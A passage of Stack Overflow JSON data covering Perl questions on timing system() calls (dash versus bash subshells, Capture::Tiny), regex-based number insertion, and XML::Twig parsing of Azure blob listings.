74865154, "body": "You could use <a href=\"https://metacpan.org/pod/Capture::Tiny\" rel=\"nofollow noreferrer\">metacpan.org/pod/Capture::Tiny</a> to capture the STDERR directly."}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1494507710, "post_id": 43915821, "comment_id": 74865449, "body": "<code>sh: 1: Syntax error</code> indicates that error originates from <code>&#47;bin&#47;sh</code>, not from <code>perl</code>."}, {"owner": {"reputation": 2792, "user_id": 1081936, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/B5cTn.png?s=128&g=1", "display_name": "terdon", "link": "https://stackoverflow.com/users/1081936/terdon"}, "reply_to_user": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1494507827, "post_id": 43915821, "comment_id": 74865550, "body": "@el.pescado yes, I know, but it is because of how perl is calling the command. Note that the same thing works fine when run directly in the shell and, more importantly, it works fine when run with a newer version of Perl."}, {"owner": {"reputation": 2792, "user_id": 1081936, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/B5cTn.png?s=128&g=1", "display_name": "terdon", "link": "https://stackoverflow.com/users/1081936/terdon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494507907, "post_id": 43915821, "comment_id": 74865612, "body": "@simbabque thanks, I&#39;ll try that. However, I fear it will only capture the stderr of the command run and not of <code>time</code>. The two are separate."}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1494507946, "post_id": 43915821, "comment_id": 74865644, "body": "It&#39;s worth remembering that your interactive shell may be different from the shell used by <code>system</code> call. Usually <code>bin&#47;sh</code> is symlink to <code>&#47;bin&#47;bash</code> but AFAIR Ubuntu used <code>&#47;bin&#47;bash</code> as interactive shell and <code>&#47;bin&#47;dash</code> for executing scripts (which includes <code>system</code>)."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494507999, "post_id": 43915821, "comment_id": 74865688, "body": "Capture::Tiny captures the output of everything that&#39;s in the block. That <i>should</i> work."}, {"owner": {"reputation": 2792, "user_id": 1081936, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/B5cTn.png?s=128&g=1", "display_name": "terdon", "link": "https://stackoverflow.com/users/1081936/terdon"}, "reply_to_user": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1494508058, "post_id": 43915821, "comment_id": 74865744, "body": "@el.pescado yes, I know it can be different, but that&#39;s not relevant, the parentheses for the subshell are POSIX. And Ubuntu (well, Debian and by extension Ubuntu) use <code>dash</code> as the login shell (which is set to <code>&#47;bin&#47;sh</code>), not as the default interactive shell (set to <code>&#47;bin&#47;bash</code>). None of this is really relevant here though."}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1494508072, "post_id": 43915821, "comment_id": 74865753, "body": "Try <code>&#47;bin&#47;sh -c &#39;time (ls)&#39;</code> vs <code>&#47;bin&#47;bash -c &#39;time (ls)&#39;</code>. On my system, the latter works whereas the former does not."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494508328, "post_id": 43915821, "comment_id": 74865977, "body": "<code>$ perl -MCapture::Tiny=capture -E &#39;my ($stdout, $stderr, $exit) = capture { system &quot;time ls&quot; }; say $stderr;&#39;</code> outputs <code>0.00user 0.00system 0:00.00elapsed 0%CPU (0avgtext+0avgdata 2388maxresident)k 0inputs+8outputs (0major+114minor)pagefaults 0swaps</code>, although I don&#39;t get why the whitespace is mixed up. On my Perl 5.20.1 with C::T 0.44 I have to explicitly import <code>capture</code>, or it will output everything though."}, {"owner": {"reputation": 2792, "user_id": 1081936, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/B5cTn.png?s=128&g=1", "display_name": "terdon", "link": "https://stackoverflow.com/users/1081936/terdon"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1494508546, "post_id": 43915821, "comment_id": 74866157, "body": "@simbabque yes! I just tried it and it does indeed work. Please post an answer and I&#39;ll accept. Oh, and I used <code>use Capture::Tiny &#39;:all&#39;;</code> as suggested in the docs and that correctly imported <code>capture</code>."}, {"owner": {"reputation": 2792, "user_id": 1081936, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/B5cTn.png?s=128&g=1", "display_name": "terdon", "link": "https://stackoverflow.com/users/1081936/terdon"}, "reply_to_user": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1494508816, "post_id": 43915821, "comment_id": 74866403, "body": "@el.pescado dammit! Yes, you&#39;re also right. Subshells <a href=\"http://pubs.opengroup.org/onlinepubs/009695399/utilities/xcu_chap02.html#tag_02_9_4\" rel=\"nofollow noreferrer\"><i>are</i> POSIX</a> but the stupid <code>dash</code> seems to not implement them. That&#39;s also probably worth an answer. And I also owe you an apology. I had mistakenly assumed the difference was the Perl version. In fact, it was the different shell since I tested the newer perl version on an Arch system whose <code>&#47;bin&#47;sh</code> is actually <code>bash</code> in POSIX mode."}], "answers": [{"comments": [{"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1494521550, "post_id": 43916664, "comment_id": 74876033, "body": "Previously I tried this using <code>qx</code> and I easily captured the whitespace as well. But now I am also getting the same output!"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1494521608, "post_id": 43916664, "comment_id": 74876062, "body": "Well <code>qx</code> is like the backticks. It returns all output, which is the point. But the OP wants <code>system</code> specifically, which returns the return code, and not the output."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1494521722, "post_id": 43916664, "comment_id": 74876134, "body": "@AbhiNickz I realize that. And I don&#39;t understand why it&#39;s happening. :-/"}, {"owner": {"reputation": 995, "user_id": 1760065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kWfhw.jpg?s=128&g=1", "display_name": "HateStackOverFlow", "link": "https://stackoverflow.com/users/1760065/hatestackoverflow"}, "edited": false, "score": 0, "creation_date": 1506988321, "post_id": 43916664, "comment_id": 80025184, "body": "Not required to use any such modules, just use backticks, details available in  Answer <a href=\"https://stackoverflow.com/a/46486568/1760065\">stackoverflow.com/a/46486568/1760065</a>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 995, "user_id": 1760065, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kWfhw.jpg?s=128&g=1", "display_name": "HateStackOverFlow", "link": "https://stackoverflow.com/users/1760065/hatestackoverflow"}, "edited": false, "score": 0, "creation_date": 1507015502, "post_id": 43916664, "comment_id": 80032660, "body": "@Jerry please reread the question. There is a subshell involved here, and the output redirection you suggest does not work. The OP in this question had already ruled that out before asking."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 3, "last_activity_date": 1494508813, "creation_date": 1494508813, "answer_id": 43916664, "question_id": 43915821, "link": "https://stackoverflow.com/questions/43915821/how-can-i-get-the-cpu-time-for-a-perl-system-call/43916664#43916664", "title": "How can I get the CPU time for a perl system call?", "body": "<p>You can use <a href=\"https://metacpan.org/pod/Capture::Tiny#capture\" rel=\"nofollow noreferrer\">Capture::Tiny</a> to capture the STDOUT and STDERR of pretty much anything in Perl.</p>\n\n<pre><code>use Capture::Tiny 'capture';\n\nmy ($stdout, $stderr, $exit) = capture { system \"time ls\" };\n\nprint $stderr;\n</code></pre>\n\n<p>For some reason the output is missing some whitespace on my system, but is  clear enough to parse out what you need.</p>\n\n<pre><code>0.00user 0.00system 0:00.00elapsed 0%CPU (0avgtext+0avgdata 2272maxresident)k\n0inputs+8outputs (0major+111minor)pagefaults 0swaps\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2792, "user_id": 1081936, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/B5cTn.png?s=128&g=1", "display_name": "terdon", "link": "https://stackoverflow.com/users/1081936/terdon"}, "edited": false, "score": 0, "creation_date": 1494540132, "post_id": 43925033, "comment_id": 74885778, "body": "Yes, thanks. I thought it wasn&#39;t a shell issue because i) parenthesized subshells are POSIX, so I assumed even <code>dash</code> (which is the default <code>&#47;bin&#47;sh</code> on Debian-based systems) would support them and ii) it worked on my Arch which has a newer perl version so I had concluded it was a Perl issue, forgetting that Arch uses <code>bash</code> as <code>&#47;bin&#47;sh</code>. <i>Sigh</i>."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1494534790, "creation_date": 1494534790, "answer_id": 43925033, "question_id": 43915821, "link": "https://stackoverflow.com/questions/43915821/how-can-i-get-the-cpu-time-for-a-perl-system-call/43925033#43925033", "title": "How can I get the CPU time for a perl system call?", "body": "<p>You've tested the command with <code>bash</code>, but you passed it to <code>sh</code>.</p>\n\n<pre><code>system(\"time (ls)\")\n</code></pre>\n\n<p>is short for</p>\n\n<pre><code>system(\"/bin/sh\", \"-c\", \"time (ls)\")\n</code></pre>\n\n<p>but you want</p>\n\n<pre><code>system(\"/bin/bash\", \"-c\", \"time (ls)\")\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "is_accepted": false, "score": 1, "last_activity_date": 1494566072, "creation_date": 1494566072, "answer_id": 43929754, "question_id": 43915821, "link": "https://stackoverflow.com/questions/43915821/how-can-i-get-the-cpu-time-for-a-perl-system-call/43929754#43929754", "title": "How can I get the CPU time for a perl system call?", "body": "<pre><code>$ time ( ls ) 2&gt; er ## works\n$ perl -e 'system(\"time (ls)\")'\nsh: 1: Syntax error: word unexpected (expecting \")\")\n</code></pre>\n\n<p>The problem is that in first case, your shell is probably <code>/bin/bash</code> whereas in second case it is <code>/bin/sh</code>. If you want to run your command with another shell, you could use <a href=\"http://perldoc.perl.org/functions/system.html\" rel=\"nofollow noreferrer\"><code>system LIST</code></a> form:</p>\n\n<pre><code>system(\"/bin/bash\", \"-c\", \"time(ls)\")\n</code></pre>\n\n<hr>\n\n<p>Note 1: There's <code>PERL5SHELL</code> environmnet value, but that seems to take effect <em>only</em> on Win32.</p>\n\n<p>Note 2: If you want to measure CPU time of child process, you could use <a href=\"http://search.cpan.org/~taffy/Unix-Getrusage-0.03/lib/Unix/Getrusage.pm\" rel=\"nofollow noreferrer\">Unix::Getrusage</a> or <a href=\"http://search.cpan.org/~jhi/BSD-Resource-1.2911/Resource.pm\" rel=\"nofollow noreferrer\">BSD::Resource</a> modules.</p>\n"}], "owner": {"reputation": 2792, "user_id": 1081936, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/B5cTn.png?s=128&g=1", "display_name": "terdon", "link": "https://stackoverflow.com/users/1081936/terdon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 574, "favorite_count": 0, "accepted_answer_id": 43916664, "answer_count": 3, "score": 2, "last_activity_date": 1494566072, "creation_date": 1494506745, "last_edit_date": 1494509071, "question_id": 43915821, "link": "https://stackoverflow.com/questions/43915821/how-can-i-get-the-cpu-time-for-a-perl-system-call", "title": "How can I get the CPU time for a perl system call?", "body": "<p>I have a perl script that calls external executables using <code>system()</code>. I would like to measure the CPU seconds taken by these external programs. Ideally, I would like to run them using the shell builtin <code>time</code> command (this is on a Linux system). Something like this:</p>\n\n<pre><code>system(\"time /path/to/command\")\n</code></pre>\n\n<p>Now, <code>time</code> prints its output to stderr, but in order to do so, launches the command it is given in a separate subshell. This means that in order to capture time's output when running manually in the shell, you need to explicitly use a subshell and redirect the subshell's stderr:</p>\n\n<pre><code>$ time ( command &gt; command.log 2&gt; command.er) 2&gt; time.out\n</code></pre>\n\n<p>The file <code>time.out</code> will have the output of the <code>time</code> command while <code>command.er</code> has the stderr of <code>command</code>. Unfortunately, the parentheses break perl's system call:</p>\n\n<pre><code>$ time ( ls ) 2&gt; er ## works\n$ perl -e 'system(\"time (ls)\")'\nsh: 1: Syntax error: word unexpected (expecting \")\")\n</code></pre>\n\n<p>And this means I can't capture the output of <code>time</code>. To make matters wors, this seems to be version dependent:</p>\n\n<pre><code>$ perl --version | head -n2\nThis is perl 5, version 18, subversion 2 (v5.18.2) built for x86_64-linux-gnu-thread-multi\n</code></pre>\n\n<p>But if I try the same thing with a newer version:</p>\n\n<pre><code>$ perl --version | head -n2\nThis is perl 5, version 24, subversion 1 (v5.24.1) built for x86_64-linux-thread-multi\n$ perl -e 'system(\"time (ls)\")'\nfile1\n\nreal    0m0.002s\nuser    0m0.000s\nsys     0m0.000s\n</code></pre>\n\n<p>Unfortunately, I need this to run on a production machine so upgrading Perl is not an option. So, how can I time a system call in Perl 5.18? I need the <code>user</code> and <code>sys</code> values, so simply recording the start and end times won't help. I am willing to use a dedicated module if that's necessary although I would prefer a trick that lets me use the shell's <code>time</code>. </p>\n\n<hr>\n\n<p>UPDATE: it turns out the difference in behavior is not because of the newer perl version but, instead, it is because I tested it on an Arch system whose <code>/bin/sh</code> is <code>bash</code> while the other commands were being run on Ubuntu systems whose <code>/bin/sh</code> is <code>dash</code>, a minimal shell that doesn't support parentheses for subshells.</p>\n"}, {"tags": ["php", "regex", "perl"], "comments": [{"owner": {"reputation": 1308, "user_id": 5371841, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/VpdlY.png?s=128&g=1", "display_name": "Mr Mystery Guest", "link": "https://stackoverflow.com/users/5371841/mr-mystery-guest"}, "edited": false, "score": 0, "creation_date": 1494503420, "post_id": 43914165, "comment_id": 74862281, "body": "Why no loop over your strings and replace &quot;<i>&quot; with &quot;i</i>&quot; where i is the loop counter ?"}, {"owner": {"reputation": 11, "user_id": 7997123, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-czuY8CyUSBg/AAAAAAAAAAI/AAAAAAAACmQ/c0uwFlNHwiw/photo.jpg?sz=128", "display_name": "Bhushan Dhormale", "link": "https://stackoverflow.com/users/7997123/bhushan-dhormale"}, "reply_to_user": {"reputation": 1308, "user_id": 5371841, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/VpdlY.png?s=128&g=1", "display_name": "Mr Mystery Guest", "link": "https://stackoverflow.com/users/5371841/mr-mystery-guest"}, "edited": false, "score": 0, "creation_date": 1494504628, "post_id": 43914165, "comment_id": 74863140, "body": "intend to do with regular expression, as the number of input parameters is not fixed"}, {"owner": {"reputation": 1268, "user_id": 2206218, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/f64a0423d5a70dc482b3818424a6ce59?s=128&d=identicon&r=PG", "display_name": "Xyzk", "link": "https://stackoverflow.com/users/2206218/xyzk"}, "edited": false, "score": 0, "creation_date": 1494505217, "post_id": 43914165, "comment_id": 74863548, "body": "Only regex tag? What are you using for replace?"}, {"owner": {"reputation": 11, "user_id": 7997123, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-czuY8CyUSBg/AAAAAAAAAAI/AAAAAAAACmQ/c0uwFlNHwiw/photo.jpg?sz=128", "display_name": "Bhushan Dhormale", "link": "https://stackoverflow.com/users/7997123/bhushan-dhormale"}, "edited": false, "score": 0, "creation_date": 1494508221, "post_id": 43914165, "comment_id": 74865870, "body": "want to try something like this  (?(?=(TEST)_(.*)|\\G)&lt;TEST&gt;&lt;DIGIT_INCREMENTED&gt;_(\\1))"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 7997123, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-czuY8CyUSBg/AAAAAAAAAAI/AAAAAAAACmQ/c0uwFlNHwiw/photo.jpg?sz=128", "display_name": "Bhushan Dhormale", "link": "https://stackoverflow.com/users/7997123/bhushan-dhormale"}, "edited": false, "score": 0, "creation_date": 1494511473, "post_id": 43917040, "comment_id": 74868597, "body": "but how to increment the count for each matched expression"}, {"owner": {"reputation": 8018, "user_id": 2064981, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/74e3e392c752c4c9acb4ca4fb8f7af65?s=128&d=identicon&r=PG&f=1", "display_name": "SamWhan", "link": "https://stackoverflow.com/users/2064981/samwhan"}, "reply_to_user": {"reputation": 11, "user_id": 7997123, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-czuY8CyUSBg/AAAAAAAAAAI/AAAAAAAACmQ/c0uwFlNHwiw/photo.jpg?sz=128", "display_name": "Bhushan Dhormale", "link": "https://stackoverflow.com/users/7997123/bhushan-dhormale"}, "edited": false, "score": 0, "creation_date": 1494513716, "post_id": 43917040, "comment_id": 74870477, "body": "Well, you asked for a regular expression. And RE isn&#39;t a programming language. The logic, and php code, really isn&#39;t in the scope of your question. But it should be <b>really</b> simple to write ;)"}], "tags": [], "owner": {"reputation": 8018, "user_id": 2064981, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/74e3e392c752c4c9acb4ca4fb8f7af65?s=128&d=identicon&r=PG&f=1", "display_name": "SamWhan", "link": "https://stackoverflow.com/users/2064981/samwhan"}, "is_accepted": false, "score": 0, "last_activity_date": 1494509745, "creation_date": 1494509745, "answer_id": 43917040, "question_id": 43914165, "link": "https://stackoverflow.com/questions/43914165/append-digit-to-a-prefix-string-using-regular-expression/43917040#43917040", "title": "Append digit to a prefix string using Regular Expression", "body": "<p>Replace</p>\n\n<pre><code>(?=_)\n</code></pre>\n\n<p>with</p>\n\n<pre><code>1\n</code></pre>\n\n<p><code>(?=_)</code> \"matches\" the <strong>position</strong> before the <code>_</code> using a positive look-ahead. It doesn't match any actual characters.</p>\n\n<p>Replacing with <code>1</code>, inserts it at the matched position.</p>\n\n<p><a href=\"https://regex101.com/r/tZrERZ/1\" rel=\"nofollow noreferrer\">See it here at regex101</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1494514417, "creation_date": 1494514417, "answer_id": 43918924, "question_id": 43914165, "link": "https://stackoverflow.com/questions/43914165/append-digit-to-a-prefix-string-using-regular-expression/43918924#43918924", "title": "Append digit to a prefix string using Regular Expression", "body": "<p>Regular expressions do not support incrementing numbers, because regular expressions are about <em>patterns</em> not <em>numbers</em>. </p>\n\n<p>However, <code>perl</code> can do something like this:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nmy $count;\n\nwhile (&lt;DATA&gt;) {\n   s/(?=_)/++$count/e;\n   print;\n}\n\n__DATA__\nTEST_ABC\nTEST_DEF\nTEST_XYZ\n</code></pre>\n\n<p>Which <em>inserts</em> an incrementing count before the first underscore in each line. </p>\n\n<p>As a one liner, this'd be;</p>\n\n<pre><code>perl -pe 's/(?=_)/++$c/e' \n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 7997123, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-czuY8CyUSBg/AAAAAAAAAAI/AAAAAAAACmQ/c0uwFlNHwiw/photo.jpg?sz=128", "display_name": "Bhushan Dhormale", "link": "https://stackoverflow.com/users/7997123/bhushan-dhormale"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 224, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1494514417, "creation_date": 1494502202, "last_edit_date": 1494506116, "question_id": 43914165, "link": "https://stackoverflow.com/questions/43914165/append-digit-to-a-prefix-string-using-regular-expression", "title": "Append digit to a prefix string using Regular Expression", "body": "<p>I need to have a Regular Expression for the below Input and Output</p>\n\n<p>Sample Input:<br/>\nTEST_ABC<br/>\nTEST_DEF<br/>\nTEST_XYZ<br/></p>\n\n<p>Sample Output:<br/>\nTEST1_ABC<br/>\nTEST2_DEF<br/>\nTEST3_XYZ<br/></p>\n\n<p>No Restrictions on sequencing the input parameters.</p>\n"}, {"tags": ["perl", "xml-parsing", "azure-storage", "xml-twig"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1494501864, "post_id": 43913677, "comment_id": 74861167, "body": "So you&#39;re saying that the XML will be mal-formed, with a closing <code>&lt;&#47;Blob&gt;</code> tag but no opening <code>&lt;Blob&gt;</code>? I doubt if <code>XML::Twig</code> will handle that."}, {"owner": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494503525, "post_id": 43913677, "comment_id": 74862343, "body": "@Borodin  No !  That was just a copy paste fail on my part (copy/paste from Linux via TMUX sometimes does weird stuff.  I have fixed it."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1494507643, "post_id": 43913677, "comment_id": 74865403, "body": "I spotted that. I have updated my answer and put a fix in a comment on <b>choroba&#39;s</b>. You can pick whichever you like!"}], "answers": [{"comments": [{"owner": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "edited": false, "score": 0, "creation_date": 1494503766, "post_id": 43914226, "comment_id": 74862507, "body": "&quot; it is simple to print the text content of all Name elements&quot; .... yeah, I figured that one out already .... the point of my question was I wanted a subset of elements. <code>list-blob</code> returns everything, I just wanted the orphans as per the doc excerpt I posted.  I think @choroba has the answer."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "edited": false, "score": 1, "creation_date": 1494505208, "post_id": 43914226, "comment_id": 74863538, "body": "@LittleCode: I&#39;m sorry, I was trying to understand the relationship between <i>uncommited</i> and <i>orphan</i> blobs (you show the doumentation for <i>uncommited</i> blobs, and never use the term again) and whether that somehow meant a <code>&lt;Blob&gt;</code> element with the opening tag missing. Your example data shows exactly one <code>&lt;Blob&gt;</code> and you want its name, and my code works fine with that. It would have been better to explain your terminology and to offer some data that required the filtering that is the point of your question. Fortunately <b>choroba</b> understood your intent."}, {"owner": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "edited": false, "score": 1, "creation_date": 1494506337, "post_id": 43914226, "comment_id": 74864399, "body": "no problem, I was trying to keep my example simple, but I guess I oversimplified !"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "edited": false, "score": 1, "creation_date": 1494507200, "post_id": 43914226, "comment_id": 74865075, "body": "@LittleCode: I&#39;ve updated my answer. You may prefer a solution that avoids using callbacks and simply builds a static data structure that you can navigate. I have also fixed a bug in <b>choroba&#39;s</b> example whereby he looks in the wrong place for the elements that mustn&#39;t appear in the message."}, {"owner": {"reputation": 1091, "user_id": 4474629, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/e3d1d6e41980939611b75370816b8843?s=128&d=identicon&r=PG&f=1", "display_name": "Little Code", "link": "https://stackoverflow.com/users/4474629/little-code"}, "edited": false, "score": 0, "creation_date": 1494507583, "post_id": 43914226, "comment_id": 74865351, "body": "You may well have had a valid point about over-simplified sample XML.  I tried choroba&#39;s answer with &quot;real&quot; code and it prints every name, not just the excluded ones.   I have updated my question accordingly and temporarily removed answer status from choroba."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": 